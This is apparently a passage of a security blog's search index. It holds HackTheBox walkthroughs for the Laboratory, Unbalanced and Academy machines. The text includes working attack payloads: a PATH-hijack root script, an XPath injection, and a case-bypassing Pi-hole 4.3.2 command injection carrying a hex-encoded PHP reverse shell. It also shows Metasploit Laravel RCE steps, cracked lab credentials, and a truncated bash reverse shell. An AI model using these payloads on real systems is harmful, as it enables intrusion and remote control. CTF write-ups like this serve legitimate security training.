`gitlab-backup` ![](/assets/img/posts/laboratory/git-back.png)* after command execute, get a `1606995456_2020_12_03_12.8.1_gitlab_backup.tar` archive (remote) git@git.laboratory.htb:/var/opt/gitlab/backups$ ls -la total 15272 drwx------ 2 git root 4096 Dec 3 11:37 . drwxr-xr-x 20 root root 4096 Dec 3 06:17 .. -rw------- 1 git git 7813120 Dec 3 11:20 1606994436_2020_12_03_12.8.1_gitlab_backup.tar ... [snip] ... #Download in local machine ❯ tar -xf 1606995456_2020_12_03_12.8.1_gitlab_backup.tar --directory gitlab_backup ❯ tree -a gitlab_backup gitlab_backup ├── artifacts.tar.gz ├── backup_information.yml ├── builds.tar.gz ├── db │   └── database.sql.gz ├── lfs.tar.gz ├── pages.tar.gz ├── repositories │   └── @hashed │   ├── 19 │   │   └── 58 │   │   ├── 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7 | │   └── 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.bundle │   └── 2c │   └── 62 │   ├── 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3 |   └── 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.bundle └── uploads.tar.gz* there are bunch of files with 2 gitlab repos and while i run the `gitlab-backup` command i see that it backup to dexter repos from gitlab - * dexter/securewebsite (@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3) ... [DONE] * dexter/securedocker (@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7) ... [DONE]* after git clone both bundle files - ❯ git clone 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.bundle Cloning into &#39;19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7&#39;... Receiving objects: 100% (10/10), done. ❯ git clone 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.bundle Cloning into &#39;2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3&#39;... Receiving objects: 100% (66/66), 7.21 MiB | 75.37 MiB/s, done. Resolving deltas: 100% (5/5), done.* when tree the cloned dirs i found ssh folder inside dexter dir -```diff❯ tree -a @hashed@hashed├── 19│   └── 58│   ├── 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7│   │   ├── create_gitlab.sh│   │   ├── dexter│   │   │   ├── recipe.url│   │   │   ├── .ssh│   │   │   │   ├── authorized_keys+   │   │   │   └── id_rsa&amp;lt;snippet&amp;gt;52 directories, 112 files find dexter ssh keyssh USER:dexter❯ pwncat -i ./id_rsa dexter@10.10.10.216[23:43:42] warning: 10.10.10.216: no working persistence methods found connect.py:222[23:43:53] new host w/ hash ae368be9697cee6ab2cd4190bba7e71b victim.py:321[23:44:12] pwncat running in /usr/bin/bash victim.py:354[23:44:18] pwncat is ready 🐈 victim.py:771[23:44:27] user not found in database; not storing password connect.py:348(remote) dexter@laboratory:/$ id+uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)(remote) dexter@laboratory:/$ cd+(remote) dexter@laboratory:/home/dexter$ cat user.txt23fa0c2d************************Privesc Enumeration after running linpeas and pwncat enumerate.gather i only notice /usr/local/bin/docker-security binary - -rwsr-xr-x 1 root dexter 17K Aug 28 14:52 /usr/local/bin/docker-security this is a linux binary file, i use ltrace to see its function before doing any reversing - (remote) dexter@laboratory:/usr/local/bin$ ls -lshtotal 20K20K -rwsr-xr-x 1 root dexter 17K Aug 28 14:52 docker-security(remote) dexter@laboratory:/usr/local/bin$ file docker-securitydocker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped (remote) dexter@laboratory:/usr/local/bin$ ltrace docker-security .setuid(0) = -1 setgid(0) = -1+system(&quot;chmod 700 /usr/bin/docker&quot;chmod: changing permissions of &#39;/usr/bin/docker&#39;: Operation not permitted &amp;lt;no return ...&amp;gt; --- SIGCHLD (Child exited) --- &amp;lt;... system resumed&amp;gt; ) = 256+system(&quot;chmod 660 /var/run/docker.sock&quot;chmod: changing permissions of &#39;/var/run/docker.sock&#39;: Operation not permitted &amp;lt;no return ...&amp;gt; --- SIGCHLD (Child exited) --- &amp;lt;... system resumed&amp;gt; ) = 256 +++ exited (status 0) +++ download binary in my local machine and open it in ghidra and view the main function - void main(void){setuid(0);setgid(0);system(&quot;chmod 700 /usr/bin/docker&quot;);system(&quot;chmod 660 /var/run/docker.sock&quot;);return;} in the main function its running chmod but without specifying it’s absolute path and use $PATH variable to determine it’s path and here path hijacking vulnerability comes into play. Root ExploitPath hijacking Reference: hackingarticles.in article a simple bash script ❯ cat scrp.shcd /tmpecho &quot;/bin/bash&quot; &amp;gt; chmodchmod +x chmodecho $PATHexport PATH=/tmp:$PATHcd /usr/local/bin./docker-security run that script and simply get the root shell - (remote) dexter@laboratory:/home/dexter$ bash scrp.sh/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/binroot@laboratory:/usr/local/bin# id uid=0(root) gid=0(root) groups=0(root),1000(dexter)root@laboratory:/usr/local/bin# cd /rootroot@laboratory:/root# cat root.txt229dd8c7************************ " }, { "title": "Hackthebox - Unbalanced", "url": "/posts/unbalanced/", "categories": "hackthebox, linux", "tags": "rsync, encfs encryption, squid proxy, squidclient, xpath injection, pihole 4.3.2, command injection", "date": "2020-11-23 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.200 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.200PORT STATE SERVICE VERSION+22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)+873/tcp open rsync (protocol version 31)+3128/tcp open http-proxy Squid http proxy 4.6|_http-server-header: squid/4.6|_http-title: ERROR: The requested URL could not be retrievedSquid http proxy : Squid is a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching web, DNS and other computer network lookups for a group of people sharing network resources, and aiding security by filtering traffic. add this proxy in foxyproxygoto : http://10.10.10.200Error : Access Denied. i don’t have any host that is allowed from the proxy so i can not get much information from here for now.rsyncrsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. It is commonly found on Unix-like operating systems. Rsync is written in C as a single threaded application.rsync Enumeration list all directories - rsync 10.10.10.200:: conf_backups EncFS-encrypted configuration backups copy conf_backups in local machine - rsync -av 10.10.10.200::conf_backups conf_backups inside conf_backups directory ❯ tree -a conf_backupsconf_backups├── 0K72OfkNRRx3-f0Y6eQKwnjn&amp;lt;snippet&amp;gt;└── ZXUUpn9SCTerl0dinZQYwxrx0 directories, 75 files folder is EncFS-encrypted of system configuration files backup. EncFS : EncFS is a Free (LGPL) FUSE-based cryptographic filesystem. It transparently encrypts files, using an arbitrary directory as storage for the encrypted files. … Files are encrypted using a volume key, which is stored either within or outside the encrypted source directory. A password is used to decrypt this key. in EncFS encryption all file name change into random text and create .encfs6.xml file that contains metadata of the encryption. searching on google i find out that johntheripper has a python script that extract password hash from .encfs6.xml file. cracking EncFS-encrypted conf_backups Folder use encfs2john.py to extract hash python3 /usr/share/john/encfs2john.py dump/conf_backups dump/conf_backups:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add crack hash using john john -w=/usr/share/wordlists/rockyou.txt encfs_hash Using default input encoding: UTF-8Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])bubblegum (conf_backups)Session completed Found Password : bubblegum decrypt conf_backups require encfs tool’s encfsctl utility which decrypt encfs filesystem. encfsctl export conf_backups encfs_decrypt EncFS Password: bubblegum ❯ tree -a encfs_decryptencfs_decrypt├── 50-localauthority.conf&amp;lt;snippet&amp;gt;+── squid.conf&amp;lt;snippet&amp;gt;└── xattr.conf0 directories, 74 filessquidsquid-proxyfrom the decrypted config files grep for htbgrep -r htbsquid.conf:acl intranet dstdomain -n intranet.unbalanced.htbInternal Host : intranet.unbalanced.htb Host is found in squid.conf and then i rewind that there a Squid http proxy service running on port 873 in the box. i already add proxy in my browser and now found a host that can accessible from the proxy. i can access to intranet.unbalanced.htb from squid-proxy i set in the foxyproxy, but i don’t find anything interesting in host web page. squid:CacheManagerFrom the decrypted config files grep for passwdgrep -r passwdsquid.conf:cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events found a cachemgr_passwd string in squid config file, reading the squid config documents i found out that there are 2 part in the cachemgr_passwd string from this doc Usage: cachemgr_passwd password action action ... in the squid config file cachemgr_passwd Specify passwords for cachemgr operations. cachemgr_passwd has tow part in it First is Password and second is action that are allowed on that passwd in this squid config file First : passwd: Thah$Sh1 Second : actiions: menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events in CacheManager documentation i found a tool squidclient: A command line utility for performing web requests. It also has a special ability to send cache manager requests to Squid proxies.User Exploitsquidclient from all specified actions in the config file i found some useful actions, here is a good blog on CacheManager actions.Action : fqdncache : This is a report of the Squid DNS cache for IP address resolution. this is same as iptable.squidclient -h 10.10.10.200 -w &#39;Thah$Sh1&#39; mgr:fqdncache HTTP/1.1 200 OK Server: squid/4.6 Mime-Version: 1.0 Date: Sat, 21 Nov 2020 04:52:08 GMT Content-Type: text/plain;charset=utf-8 Expires: Sat, 21 Nov 2020 04:52:08 GMT Last-Modified: Sat, 21 Nov 2020 04:52:08 GMT X-Cache: MISS from unbalanced X-Cache-Lookup: MISS from unbalanced:3128 Via: 1.1 unbalanced (squid/4.6) Connection: close FQDN Cache Statistics: FQDNcache Entries In Use: 11 FQDNcache Entries Cached: 10 FQDNcache Requests: 19292 FQDNcache Hits: 0 FQDNcache Negative Hits: 8790 FQDNcache Misses: 10502 FQDN Cache Contents: Address Flg TTL Cnt Hostnames 10.10.14.3 N -36278 0 127.0.1.1 H -001 2 unbalanced.htb unbalanced ::1 H -001 3 localhost ip6-localhost ip6-loopback+ 172.31.179.2 H -001 1 intranet-host2.unbalanced.htb+ 172.31.179.3 H -001 1 intranet-host3.unbalanced.htb 127.0.0.1 H -001 1 localhost+ 172.17.0.1 H -001 1 intranet.unbalanced.htb ff02::1 H -001 1 ip6-allnodes ff02::2 H -001 1 ip6-allrouters 10.10.15.75 N -47928 0 Found 3 working Host IPs - 172.31.179.2172.31.179.3172.17.0.1 but these IPs goes on same place (/intranet.php) where intranet.unbalanced.htb goes that i found before. All hosts have same login page with username and passworrd field. I try diffrent types of injection. I create a simple burp intruder list of diffrent injections from PayloadAllTheThings but none of them worked on any of these hosts. for intercepting internal Hosts request i set squid proxy http://10.10.10.200:3128 as upstream proxy in burpSuite eventually i try for 172.31.179.1 and this give an error - Host temporarily taken out of load balancing for security maintenance. i tried 172.31.179.1/intranet.php as all Hosts redirected here and i got that same login page. again, i run my intruder list and this time i found a working injection in the password field.XPATH injection 1 2Passowrd field is vulnerable for xpath injectionXPathi Payload&#39; or &#39;1&#39;=&#39;1 get some employees details ritaRita Fubellirita@unbalanced.htbRole: HR ManagerjimJim Mickelsonjim@unbalanced.htbRole: Web DesignerbryanBryan Angstrombryan@unbalanced.htbRole: System AdministratorsarahSarah Goodmansarah@unbalanced.htbRole: Team Leader after some time on brupSuite testing XPath injection i found a way to extract password strings using xpath injection like sqli. Payload : &#39; or Username=&#39;bryan&#39;and substring(Password,$i,1)=&#39;$c i create a bruteforce script that extract password from database using XPath vulnerability. payload is worked like a sql boolean based injection. when $i=$c then page return Username contact details, and if $i!=$c then page return Invalid credentials.where i is a int and c is a char it takes some time to extract all password form the database credsrita:password01!jim:stairwaytoheavenbryan:ireallyl0vebubblegum!!!sarah:sarah4evahssh bruteforcehydra -L usernames -P password 10.10.10.200 -t 4 ssh [DATA] attacking ssh://10.10.10.200:22/+[22][ssh] host: 10.10.10.200 login: bryan password: ireallyl0vebubblegum!!! 1 of 1 target successfully completed, 1 valid password foundssh-creds : bryan:ireallyl0vebubblegum!!!USER:bryan shellssh bryan@10.10.10.200+bryan@10.10.10.200&#39;s password: ireallyl0vebubblegum!!!Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64bryan@unbalanced:~$ cat user.txtf91a0994************************Privesc enumeration in the bryan home folder there is a TODO file and inside the file there is a service specified that is running on localhost - ############ Pi-hole ############* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]* Set temporary admin password [DONE]* Create Pi-hole configuration script [IN PROGRESS]- Run Pi-hole configuration script [TODO]- Expose Pi-hole ports to the network [TODO] Pi-hole : Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.enumerating Pi-hole check service port bryan@unbalanced:~$ ss -lnpt | grep 127.0.0.1LISTEN 0 128 127.0.0.1:8080 0.0.0.0:*LISTEN 0 128 127.0.0.1:5553 0.0.0.0:* Port 5553 is not responding Port 8080 give an error [ERROR]: Unable to parse results from queryads.php: Unhandled error message (Invalid domain!) setup ssh with tunnelGobustergobuster dir -u http://127.0.0.1:8080/ -w words -b 200I use -b to ignore all 200 responses. because of that server’s custom error every request give 200.found : /admin (Status: 301) from the http://127.0.0.1:8080/admin/ i got Pi-hole admin panel. I also find a Pi-hole’s docker public IP that is accessible form squid-proxy - linpeas scan - [+] Networks and neighbours10.10.10.2 dev ens160 lladdr 00:50:56:b9:16:1a REACHABLE172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 STALE172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALEfe80::250:56ff:feb9:161a dev ens160 lladdr 00:50:56:b9:16:1a router STALEIP address HW type Flags HW address Mask Device10.10.10.2 0x1 0x2 00:50:56:b9:16:1a * ens160172.31.179.1 0x1 0x2 02:42:ac:1f:b3:01 * br-742fc4eb92b1172.31.11.3 0x1 0x2 02:42:ac:1f:0b:03 * br-742fc4eb92b1 these IPs are in the arp table cat /proc/net/arp - IP address HW type Flags HW address Mask Device10.10.10.2 0x1 0x2 00:50:56:b9:16:1a * ens160172.31.179.1 0x1 0x2 02:42:ac:1f:b3:01 * br-742fc4eb92b1172.31.11.3 0x1 0x2 02:42:ac:1f:0b:03 * br-742fc4e IP 172.31.179.1 is the same XPath vulnerable host IP 172.31.11.3 is Pi-hole docker IP Access to 172.31.11.3 from squid-proxy gives Pi-hole admin console and here i found Pi-hole version is 4.3.2 Pi-hole Version v4.3.2 Web Interface Version v4.3 FTL Version v4.3.1 On the console i got a pi-hole hostname pihole.unbalanced.htb login with temporary password:admin - login successful IP:127.0.0.1 and IP: 172.31.11.3 give same result because Pi-hole instance is accessible from both local and squid-proxy. search for Pi-hole 4.3.2 vulnerability i got an exploit from ExploitDB Exploting Pi-holeExploit Impact : Pi-hole Web v4.3.2 (aka AdminLTE) allows Remote Code Execution by privileged dashboard users via a crafted DHCP static lease.Exploit Reason : defining MAC address while configuring DHCP leases form pi-hole is not validate the mac address properly so one can manipulate that mac address field and put reverse shell and execute it.refer to natedotred bolg for complete exploitation process.Goto Pi-hole Web-Console » Admin-Panel » Settings (login with Password:admin) » DHCP tabhttp://172.31.11.3/admin/settings.php?tab=piholedhcp legitimate MAC address format should be as follows: aaaaaaaaaaaa The MAC address input can be tampered to execute arbitrary code: aaaaaaaaaaaa$PATH configure DHCP leas with tampered MAC MAC address IP address Hostname aaaaaaaaaaaa$PATH 10.10.10.200 10.10.10.200 got output like this: MAC address IP address Hostname AAAAAAAAAAAA/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 10.10.10.200 10.10.10.200 pi-hole “savesettings.php” is responsible for this vulnerability. lines 53-57: The application first validates the MAC address format using the function preg_match().function validMAC($mac_addr){ // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case) return (preg_match(&#39;/([a-fA-F0-9]{2}[:]?){6}/&#39;, $mac_addr) == 1);}lines 542-550: then check only html special characters and converts the input to uppercase.$mac = $_POST[&quot;AddMAC&quot;];if(!validMAC($mac)){ $error .= &quot;MAC address (&quot;.htmlspecialchars($mac).&quot;) is invalid!&amp;lt;br&amp;gt;&quot;;}$mac = strtoupper($mac);lines 588-592: then adds the entry to DHCP using a pihole system command.if(!strlen($error)){ exec(&quot;sudo pihole -a addstaticdhcp &quot;.$mac.&quot; &quot;.$ip.&quot; &quot;.$hostname); $success .= &quot;A new static address has been added&quot;;}Exploit exception : MAC address input convert input data in upperCase letters and if we put shellcode in it. it converts all code in upperCase, As Linux commands are case sensitive, this would fail.the way to overcome this difficulty is to make use of environment variables and POSIX Shell Parameter Expansions.Manual Exploitpayload EncodingReverse Shell Payload : aaaaaaaaaaaa&amp;amp;&amp;amp;php -r ‘$sock=fsockopen(“tun0”,4141);exec(“/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3”);’there are three peices in the payload First, MAC address aaaaaaaaaaaa use as it is. Second, environment variables, In the encoded shell command we define the $P, $H and $R shell parameters that contain their matching lower-case character with the following POSIX Shell Parameter Expansions: Example❯ W=${PATH#/???/}echo $Wbash:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin❯ P=${W%%?????:*}echo $PpAll variables:W=${PATH#/???/}P=${W%%?????:}X=${PATH#/???/??}H=${X%%???:}Z=${PATH#:/??}R=${Z%%/}and now the payload looks life this: &amp;lt;MAC&amp;gt;&amp;amp;&amp;amp;&amp;lt;variables&amp;gt; aaaaaaaaaaaa&amp;amp;&amp;amp;W=${PATH#/???/}&amp;amp;&amp;amp;P=${W%%?????:*}&amp;amp;&amp;amp;X=${PATH#/???/??}&amp;amp;&amp;amp;H=${X%%???:*}&amp;amp;&amp;amp;Z=${PATH#*:/??}&amp;amp;&amp;amp;R=${Z%%/*}&amp;amp;&amp;amp;$P$H$P$IFS-$R$IFShere $IFS is a default shell delimiter character which is a space.Third, reverse shell code &#39;php -r \\&#39;$sock=fsockopen(&quot;tun0&quot;,4141);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);\\&#39;&#39; in hex coded form, inside the php function - ’EXEC(HEX2BIN(“&amp;lt;shellcode&amp;gt;”));’&amp;amp;&amp;amp; I use python to encode payload into hex - ❯ python2Python 2.7.18 (default, Apr 20 2020, 20:30:41) [GCC 9.3.0] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt; p = &#39;php -r \\&#39;$sock=fsockopen(&quot;tun0&quot;,4141);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);\\&#39;&#39;&amp;gt;&amp;gt;&amp;gt; p.encode(&quot;hex&quot;).upper()&#39;706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3437222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27&#39; Final payload : aaaaaaaaaaaa&amp;amp;&amp;amp;W=${PATH#/???/}&amp;amp;&amp;amp;P=${W%%?????:*}&amp;amp;&amp;amp;X=${PATH#/???/??}&amp;amp;&amp;amp;H=${X%%???:*}&amp;amp;&amp;amp;Z=${PATH#*:/??}&amp;amp;&amp;amp;R=${Z%%/*}&amp;amp;&amp;amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;&amp;lt;shellcode&amp;gt;&quot;));&#39;&amp;amp;&amp;amp;My Payload : aaaaaaaaaaaa&amp;amp;&amp;amp;W=${PATH#/???/}&amp;amp;&amp;amp;P=${W%%?????:*}&amp;amp;&amp;amp;X=${PATH#/???/??}&amp;amp;&amp;amp;H=${X%%???:*}&amp;amp;&amp;amp;Z=${PATH#*:/??}&amp;amp;&amp;amp;R=${Z%%/*}&amp;amp;&amp;amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3339222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27&quot;));&#39;&amp;amp;&amp;amp;Notes: Both IPs from squid-proxy 172.31.11.3 or with ssh tunnel on 127.0.0.1:8080 give a reverse shell as www-dataRoot Privesc user www-data is able to read /root dir $ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ cd /root$ pwd/root$ ls -la-rw-r--r-- 1 root root 113876 Sep 20 2019 ph_install.sh-rw-r--r-- 1 root root 485 Apr 6 2020 pihole_config.sh inside pihole_config.sh file $ cat pihole_config.sh#!/bin/bash# Add domains to whitelist/usr/local/bin/pihole -w unbalanced.htb/usr/local/bin/pihole -w rebalanced.htb# Set temperature unit to Celsius/usr/local/bin/pihole -a -c # Add local host record/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1# Set privacy level/usr/local/bin/pihole -a -l 4# Set web admin interface password/usr/local/bin/pihole -a -p &#39;bUbBl3gUm$43v3Ry0n3!&#39;# Set admin email/usr/local/bin/pihole -a email admin@unbalanced.htb there is a Pi-hole admin password: bUbBl3gUm$43v3Ry0n3! and su using this password from bryan’s ssh shell worked and get root shell bryan@unbalanced:~$ su - rootPassword: bUbBl3gUm$43v3Ry0n3!root@unbalanced:~# iduid=0(root) gid=0(root) groups=0(root)root@unbalanced:~# cat root.txt8c97fa50************************ " }, { "title": "Hackthebox - Academy", "url": "/posts/academy/", "categories": "hackthebox, linux", "tags": "laravel, cve-2018-15133, audit log, sudo composer", "date": "2020-11-07 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.215 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.215PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://academy.htb/33060/tcp open mysqlx?| fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message&quot;|_ HY000 on port 80 10.10.10.215 redirect to academy.htb add academy.htb in /etc/hostsWeb_serverGobustergobuster dir -u 10.10.10.215 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php -t 50/academy (Status: 301)gobuster dir -u http://10.10.10.215/academy/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 40 -b 401,402,403,404/.env (Status: 200) directory brute-forcing host give so much information and the direct ssh for user in .env , I think this is unintended because it skips the foothold part .VHOST:academy.htb in the right corner there are two options login register gobuster also identify themGobustergobuster dir -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -t 50/admin.php (Status: 200)/login.php (Status: 200)/register.php (Status: 200)loginNothing interested in loginregister in the source found hidden tag &amp;lt;input type=&quot;hidden&quot; value=&quot;0&quot; name=&quot;roleid&quot; /&amp;gt; roleid is related to RST_API there is a Role management system in the REST_API Role management resources provide a facility to manage roles used to determine resource access for users. roleid set either a name or number eg. user or 0 intercept register request in burp found roleid parameter uid=test1&amp;amp;password=test1&amp;amp;confirm=test1&amp;amp;roleid=0 this server is using numbers as roleid after some tries i found that there are only two IDs 0 or 1 roleid=0 register a user account roleid=1 register a admin account so i intercept a register request change roleid to 1 and create a admin accountadminfound admin.php in gobuster scan login with registered roleid=1 creds found a VHOST and 2 users Complete initial set of modules (cry0l1t3 / mrb3n) doneFix issue with dev-staging-01.academy.htb pending add in /etc/hostsVHOST:dev-staging-01.academy.htb there is some kind of application running on the host and it return a error message. UnexpectedValueException reading thru it i found some interesting data APP_NAME &quot;Laravel&quot;APP_KEY &quot;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&quot;DB_CONNECTION &quot;mysql&quot;DB_HOST &quot;127.0.0.1&quot;DB_PORT &quot;3306&quot;DB_DATABASE &quot;homestead&quot;DB_USERNAME &quot;homestead&quot;DB_PASSWORD &quot;secret&quot; found application name and mysql config but db is in local so not useful for now . Laraveldescription : Laravel is a free, open-source PHP web application framework which is accessible, powerful, and provides tools required for large, robust applications.vulnerability : found RCE CVE-2018-15133 and msf module for that CVE .I don’t find which Laravel version running on the server but i give it a go and use msf to check if it works and it worked and give www-data shell Exploit PoC on github@kozmicUser Exploitgetting user is a long road from user www-data&amp;gt;&amp;gt;cry0l1t3&amp;gt;&amp;gt;mrb3n to get root privescwww-data shellwhat is exploit : Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an deserialized call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack. exploit pre-requirement is APP_KEY which i already foundExploit using MSFExploit Module : exploit/unix/http/laravel_token_unserialize_execmsf5 exploit(unix/http/laravel_token_unserialize_exec) &amp;gt; set RHOSTS 10.10.10.215RHOSTS =&amp;gt; 10.10.10.215msf5 exploit(unix/http/laravel_token_unserialize_exec) &amp;gt; set VHOST dev-staging-01.academy.htbVHOST =&amp;gt; dev-staging-01.academy.htbmsf5 exploit(unix/http/laravel_token_unserialize_exec) &amp;gt; set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=app_key =&amp;gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=[*] Command shell session 1 openedpython3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;www-data@academy:/var/www/html/htb-academy-dev-01/public$ whoami;idwhoami;idwww-datauid=33(www-data) gid=33(www-data) groups=33(www-data)Escalating to cry0l1t3 running linpeas script found nothing except that .env file form /var/www/html/academy/ directory that contains some passwords . .env file contains creds for local sql database DB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=academyDB_USERNAME=devDB_PASSWORD=mySup3rP4s5w0rd!! but not able to login into the database using these creds try spraying that password to all users with hydra for ssh login, hydra -L users.txt -P password.txt 10.10.10.215 -t 4 ssh [DATA] attacking ssh://10.10.10.215:22/[22][ssh] host: 10.10.10.215 login: cry0l1t3 password: mySup3rP4s5w0rd!!1 of 1 target successfully completed, 1 valid password found thats why i thought that founding .env file from gobuster is unintendedcredscry0l1t3:mySup3rP4s5w0rd!! ssh ssh cry0l1t3@10.10.10.215 cry0l1t3@10.10.10.215&#39;s password: mySup3rP4s5w0rd!!$ bashcry0l1t3@academy:~$ cat user.txtea657863************************ Escalating to mrb3n user cry0l1t3 is in adm group cry0l1t3@academy:~$ groupscry0l1t3 admcry0l1t3@academy:/home$ iduid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm) adm group : adm Group is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group. that means user cry0l1t3 can read system logs. understand all types of log in linux by privacyangel.com there is a audit log dir which is suspiciou. audit log : can use to learn about user activity, which could be used to boost efficiency, security, and performance. audit logs create by linux auditclt service. Note : that audit logs store users commands inputs in DATA field in hex form. I grep all su commands from audit logs and found some interesting dataFinal result cry0l1t3@academy:/var/log/audit$ grep -r -w su | grep data audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A cry0l1t3@academy:/var/log/audit$ grep -r -w su | grep data | awk -F= &#39;{print $11}&#39; 6D7262336E5F41634064336D79210A cry0l1t3@academy:/var/log/audit$ echo $(grep -r -w su | grep data | awk -F= &#39;{print $11}&#39;) | xxd -r -p mrb3n_Ac@d3my! so user with uid=1002 run su with there own password as command input eg. su mrb3n_Ac@d3my! thats why this log generated. viewing /etc/passwd i find out that UID=1002 belong to user mrb3n.credsmrb3n:mrb3n_Ac@d3my!su to mrb3ncry0l1t3@academy:~$ su - mrb3nPassword: mrb3n_Ac@d3my!$ bashmrb3n@academy:~$ whoami;idmrb3nuid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)Local Enumeration check sudo rights sudo -l User mrb3n may run the following commands on academy: (ALL) /usr/bin/composer user mrb3n run composer as root Composer is a tool for dependency management in PHP. It allows you to declare the libraries your project depends on and it will manage (install/update) them for you. First thing first find the composer documentation form the doc i found that the composer run scripts Note : Only scripts defined in the composer.json are executed . attack surface Create a composer.json file and inside that file specify reverse shell script in the script doc i found composer.json template best for custom script execution run composer and execute the scriptRoot ExploitFirst, create composer.json file{ &quot;scripts&quot;: { &quot;hack&quot;: [ &quot;bash shell.sh&quot; ] }}Second, create shell.sh scriptbash -i &amp;gt;&amp;amp; 